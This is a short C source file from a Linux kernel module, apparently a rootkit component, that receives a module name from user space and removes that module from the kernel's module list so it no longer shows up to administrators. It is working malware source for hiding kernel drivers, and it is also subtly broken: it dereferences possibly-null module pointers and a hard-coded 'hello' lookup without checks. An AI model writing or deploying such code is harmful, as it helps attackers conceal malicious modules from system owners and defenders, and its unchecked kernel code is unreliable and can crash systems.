#include "../khook/engine.h"
#include "../protocol.h"
#include "driver_hiding.h"

#include <linux/init.h>
#include <linux/module.h> //module
#include <linux/kernel.h> //module
#include <linux/uaccess.h> // copy_from_user





static int hide_driver(const char* name) {
    char kernel_name[100];
    strncpy_from_user(kernel_name,name,100);
    struct module *target = NULL;
    
    target = find_module(kernel_name);
    printk(KERN_INFO "can get module %s",find_module((const char*)"hello")->name);
    list_del(&target->list);
    return 0;
    
}

int handle_driver_hiding_request(void *raw_subargs) {
    struct DriverHidingSubargs subargs;
    if (copy_from_user(&subargs, (void *)raw_subargs, sizeof(struct DriverHidingSubargs)) != 0) {
        // copy failed
        goto err;
    }
    if (hide_driver(subargs.name) != 0) {
        // process hide failed
        goto err;
    }
    return 0;

    err:
    return 1;
}

